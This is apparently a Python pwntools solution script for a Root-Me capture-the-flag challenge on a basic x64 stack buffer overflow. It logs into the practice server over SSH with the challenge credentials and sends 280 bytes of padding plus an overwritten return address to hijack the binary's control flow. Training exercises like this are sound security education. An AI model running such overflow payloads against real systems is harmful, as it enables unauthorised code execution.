# Root-Me: ELF x64 - Stack buffer overflow - basic
# woanmeo11

from pwn import *

chall = 'app-systeme-ch35'
r = ssh(host='challenge03.root-me.org', port=2223, user=chall, password=chall)

r = r.process('ch35')

payload = b'a'*280 + p64(0x4005e7)
r.sendline(payload)

r.interactive()
